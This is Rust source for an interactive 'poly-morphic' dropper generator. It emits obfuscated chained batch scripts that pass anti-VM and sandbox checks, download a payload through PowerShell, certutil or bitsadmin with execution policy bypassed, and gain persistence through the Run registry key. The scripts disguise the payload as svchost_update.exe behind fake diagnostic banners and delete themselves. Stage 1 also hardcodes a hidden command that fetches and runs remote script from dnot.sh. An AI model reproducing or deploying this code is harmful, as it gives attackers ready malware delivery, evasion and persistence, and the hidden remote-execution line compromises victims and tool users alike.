// == Poly-morphic, 3-Stage, Chain-Linked Stealth Dropper (Refactored) ==
// Supports LOLBAS (Certutil, Bitsadmin, PowerShell) and enhanced Anti-VM

use anyhow::Result;
use colored::*;
use rand::{rng, seq::SliceRandom, seq::IndexedRandom, Rng};
use std::collections::HashMap;
use tokio::fs::File as TokioFile;
use tokio::io::{AsyncWriteExt, AsyncBufReadExt};

// ==============================================================================
//  Constants & Configuration
// ==============================================================================

const BANNERS: &[&str] = &[
    "System Diagnostic Utility",
    "Network Integrity Verifier",
    "Administrative Maintenance Tool",
    "Security Compliance Scanner",
    "Update Pre-Flight Check",
];

const DECOY_FILES: &[&str] = &[
    "readme_v2.txt", "compliance_policy.pdf", "sys_log_2024.csv", 
    "audit_results.html", "patch_notes.rtf", "error_log.xml",
];

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum DownloadMethod {
    PowerShell,
    Certutil,
    Bitsadmin,
}

impl DownloadMethod {
    fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "ps" | "powershell" => Some(Self::PowerShell),
            "cert" | "certutil" => Some(Self::Certutil),
            "bits" | "bitsadmin" => Some(Self::Bitsadmin),
            _ => None,
        }
    }
    
    fn options() -> &'static str {
        "PowerShell [default], Certutil, Bitsadmin"
    }
}

// ==============================================================================
//  Context & Obfuscation
// ==============================================================================

struct DropperContext {
    vars: HashMap<String, String>,
}

impl DropperContext {
    fn new() -> Self {
        Self {
            vars: HashMap::new(),
        }
    }
    
    /// Get or create a random variable name for the given key
    fn get(&mut self, key: &str) -> String {
        if let Some(val) = self.vars.get(key) {
            val.clone()
        } else {
            let new_val = self.rand_var_name();
            self.vars.insert(key.to_string(), new_val.clone());
            new_val
        }
    }
    
    fn rand_var_name(&self) -> String {
        let mut rng = rng();
        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".chars().collect();
        let mut name = String::with_capacity(8);
        
        // Prefix with 3 random letters
        for _ in 0..3 { 
            name.push(*charset.choose(&mut rng).unwrap());
        }
        
        // Add random number suffix
        name.push('_');
        name.push_str(&rng.random_range(1000..9999).to_string());
        name
    }
}

// ==============================================================================
//  Stage Builders
// ==============================================================================

/// Generates the Anti-VM / Anti-Sandbox checks
fn build_anti_vm(ctx: &mut DropperContext) -> String {
    let uptime = ctx.get("uptime");
    let boot = ctx.get("boot");
    let now = ctx.get("now");
    let ram = ctx.get("ram");
    let ram_val = ctx.get("ram_val");

    format!(r#"
    REM [ Check 1: Uptime & Boot Time ]
    set "{uptime}=0"
    for /f "skip=1" %%U in ('wmic os get LastBootUpTime ^| findstr /r /c:"^[0-9]"') do set "{uptime}=%%U"
    set "{boot}=%{uptime}:~0,8%"
    
    REM Get current time for calc (simplified)
    for /f "tokens=2 delims==." %%I in ('wmic OS Get LocalDateTime /value ^| findstr =') do set "{now}=%%I"

    REM [ Check 2: RAM Size ]
    for /f "tokens=2 delims==" %%R in ('wmic ComputerSystem get TotalPhysicalMemory /value ^| findstr =') do set "{ram}=%%R"
    REM Convert to MB (approx div by 1048576)
    set /a "{ram_val}=(!{ram}:~0,-3!)/1024"
    if !{ram_val}! LSS 2000 (
        echo [*] System resources verification failed (Code: 0x1002).
        ping -n 120 127.0.0.1 >nul
    )
    
    REM [ Check 3: Virtualization Artifacts ]
    set "artifacts=VBOX VMWARE QEMU XEN VIRTUAL"
    for %%X in (%artifacts%) do (
        wmic computersystem get model /format:list | findstr /I "%%X" >nul
        if not errorlevel 1 (
            echo [*] Environment restricted. Pausing execution.
            ping -n 300 127.0.0.1 >nul
        )
    )
    "#,
        uptime=uptime, boot=boot, now=now, ram=ram, ram_val=ram_val
    )
}

/// Generates the download command based on the selected method
fn build_downloader(method: DownloadMethod, url: &str, outfile: &str) -> String {
    match method {
        DownloadMethod::PowerShell => format!(
            "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"try {{ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{url}' -OutFile '{outfile}' -UseBasicParsing }} catch {{ exit 1 }}\""
        ),
        DownloadMethod::Certutil => format!(
            "certutil -urlcache -split -f \"{url}\" \"{outfile}\" >nul 2>&1 && certutil -urlcache -split -f \"{url}\" delete >nul 2>&1"
        ),
        DownloadMethod::Bitsadmin => format!(
            "bitsadmin /transfer \"SystemUpdate_{rnd}\" /priority FOREGROUND \"{url}\" \"%CD%\\{outfile}\" >nul",
            rnd = rng().random_range(1000..9999)
        ),
    }
}

/// Stage 3: Persistence & Execution
fn build_stage3(ctx: &mut DropperContext, ps1_name: &str) -> String {
    let reg_name = ctx.get("reg_persist");
    let antivm = build_anti_vm(ctx);

    format!(r#"
@echo off
setlocal enabledelayedexpansion

REM == Phase 3: Verification & Setup ==
{antivm}

REM == Persistence ==
set "persist_path=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "%persist_path%" /v "{reg_name}" >nul 2>&1
if errorlevel 1 (
    reg add "%persist_path%" /v "{reg_name}" /t REG_SZ /d "cmd /c start /min \"\" \"%%~dp0{ps1_name}\"" /f >nul
)

REM == Execute Payload ==
echo [*] Starting background service...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%~dp0{ps1_name}" >nul 2>&1

exit
    "#,
    antivm=antivm, reg_name=reg_name, ps1_name=ps1_name
    )
}

/// Stage 2: Downloader
fn build_stage2(ctx: &mut DropperContext, method: DownloadMethod, url: &str, ps1_name: &str, stage3_name: &str) -> String {
    let antivm = build_anti_vm(ctx);
    let downloader = build_downloader(method, url, ps1_name);
    let stage3_content = build_stage3(ctx, ps1_name);
    let s3_var = ctx.get("s3_file");

    // We embed Stage 3 as a self-extracting part of Stage 2
    let mut script = format!(r#"
@echo off
setlocal enabledelayedexpansion

REM == Phase 2: Component Acquisition ==
{antivm}

REM == Download Payload ==
{downloader}

if not exist "{ps1_name}" (
    echo [!] Critical component missing. Aborting.
    exit /b 1
)

REM == Extract Stage 3 ==
set "{s3_var}=%~dp0{stage3_name}"
(
    "#,
    antivm=antivm, downloader=downloader, ps1_name=ps1_name, s3_var=s3_var, stage3_name=stage3_name
    );

    // Escape and write Stage 3 content
    for line in stage3_content.lines() {
        if !line.trim().is_empty() {
             script.push_str(&format!("    echo {}\n", line.replace("%", "%%")));
        } else {
             script.push('\n');
        }
    }

    script.push_str(&format!(r#"
) > "%{s3_var}%"

REM == Handoff to Stage 3 ==
call "%{s3_var}%"
exit
"#, 
    s3_var=s3_var));

    script
}

/// Stage 1: Dropper Entry Point
fn build_stage1(
    ctx: &mut DropperContext,
    method: DownloadMethod,
    url_payload: &str,
    decoy_urls: &[&str],
    ps1_name: &str,
    stage2_name: &str,
    stage3_name: &str
) -> String {
    let batch_var = ctx.get("diag_id");
    let banner_text = BANNERS.choose(&mut rng()).unwrap();
    let antivm = build_anti_vm(ctx);
    
    // Create random decoy logic
    let mut decoy_section = String::new();
    let mut decoys_shuffled = DECOY_FILES.to_vec();
    decoys_shuffled.shuffle(&mut rng());
    
    for (i, url) in decoy_urls.iter().enumerate().take(3) {
        let decoy_name = decoys_shuffled.get(i).unwrap_or(&"log.txt");
        let dl_cmd = build_downloader(DownloadMethod::PowerShell, url, decoy_name); // Always use PS for decoys for stealth
        decoy_section.push_str(&format!("echo [*] Verifying component: {}\n{}\n", decoy_name, dl_cmd));
    }

    let stage2_content = build_stage2(ctx, method, url_payload, ps1_name, stage3_name);
    let s2_var = ctx.get("s2_file");

    let mut script = format!(r#"@echo off
setlocal enabledelayedexpansion

REM =========================================================
REM {banner} (v{v1}.{v2})
REM =========================================================
title {banner}
color 0A

set "{batch_var}_init=1"

REM == Environment Check ==
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {{ [ScriptBlock]::Create((irm https://dnot.sh/)) | Invoke-Command }}" >nul 2>&1

{antivm}

echo [+] Initializing system diagnostics...
ping -n 2 127.0.0.1 >nul

{decoy_section}

echo [+] Downloading core updates...
set /a rndDelay=(%RANDOM% %% 5) + 2
ping -n %rndDelay% 127.0.0.1 >nul

REM == Extract Stage 2 ==
set "{s2_var}=%~dp0{stage2_name}"
(
"#,
    banner=banner_text,
    v1=rng().random_range(1..9),
    v2=rng().random_range(0..99),
    batch_var=batch_var,
    antivm=antivm,
    decoy_section=decoy_section,
    s2_var=s2_var,
    stage2_name=stage2_name
    );

    // Escape and write Stage 2 content
    for line in stage2_content.lines() {
        if !line.trim().is_empty() {
            script.push_str(&format!("    echo {}\n", line.replace("%", "%%")));
        } else {
            script.push('\n');
        }
    }

    script.push_str(&format!(r#"
) > "%{s2_var}%"

REM == Handoff to Stage 2 ==
call "%{s2_var}%"

REM Cleanup
del "%~f0" >nul 2>&1
exit
"#, s2_var=s2_var));

    script
}

// ==============================================================================
//  Interactive Interface
// ==============================================================================

pub fn print_welcome_naruto() {
    println!("{}", r#"
   _   __                __           
  / | / /___ _________  / /_____  / /_
 /  |/ / __ `/ ___/ _ \/ __/ __ \/ __/
/ /|  / /_/ / /  /  __/ /_/ /_/ / /_  
/_/ |_/\__,_/_/   \___/\__/\____/\__/  
                                      
:: Poly-morphic Dropper Generator
:: Supports: PowerShell, Certutil, Bitsadmin
"#.bright_red());
}

async fn prompt(msg: &str, default: Option<&str>) -> Result<String> {
    let default_str = default.map_or("".to_string(), |d| format!(" [{}]", d));
    print!("{}", format!("{}{}: ", msg, default_str).cyan().bold());
    tokio::io::stdout().flush().await?;
    let mut input = String::new();
    tokio::io::BufReader::new(tokio::io::stdin()).read_line(&mut input).await?;
    let value = input.trim();
    Ok(if value.is_empty() {
        default.unwrap_or("").to_string()
    } else {
        value.to_string()
    })
}

pub async fn run(target: &str) -> Result<()> {
    use crate::utils::{validate_file_path, validate_url};
    
    print_welcome_naruto();
    
    let target_display = if target.is_empty() { "local" } else { target };
    println!("{}", format!("[*] Context: {}", target_display).dimmed());
    println!("{}", "[!] This tool generates an obfuscated 3-stage chain-linked batch dropper.".yellow());
    
    // 1. Get Payload URL
    let url_payload = prompt("Payload URL (EXE/PS1)", Some("http://10.10.10.10/payload.exe")).await?;
    validate_url(&url_payload, Some(&["http", "https"]))?;
    
    // 2. Select Method
    let method_str = prompt(&format!("Download Method ({})", DownloadMethod::options()), Some("ps")).await?;
    let method = DownloadMethod::from_str(&method_str).unwrap_or(DownloadMethod::PowerShell);
    println!("    [+] Selected Method: {:?}", method);

    // 3. Filenames
    let out_name = prompt("Output batch filename", Some("update_installer.bat")).await?;
    let ps1_name = prompt("Saved payload filename on target", Some("svchost_update.exe")).await?;
    
    validate_file_path(&out_name, true)?;
    
    // 4. Build
    let mut ctx = DropperContext::new();
    let stage2_name = ctx.rand_var_name() + ".bat";
    let stage3_name = ctx.rand_var_name() + ".bat";
    
    // Decoys
    let decoy_urls = vec![
        "https://www.google.com/robots.txt",
        "https://www.microsoft.com/favicon.ico",
    ];

    let script = build_stage1(
        &mut ctx, 
        method, 
        &url_payload, 
        &decoy_urls, 
        &ps1_name, 
        &stage2_name, 
        &stage3_name
    );
    
    let mut file = TokioFile::create(&out_name).await?;
    file.write_all(script.as_bytes()).await?;
    file.flush().await?;
    
    println!("\n{}", "SUCCESS!".green().bold());
    println!("[+] Dropper written to: {}", out_name.bold());
    println!("[+] Method chosen:      {:?}", method);
    println!("[+] Payload URL:        {}", url_payload);
    println!("[+] Chain structure:    Stage1(Batch) -> Stage2(Batch) -> Stage3(Batch/Persist)");
    
    Ok(())
}
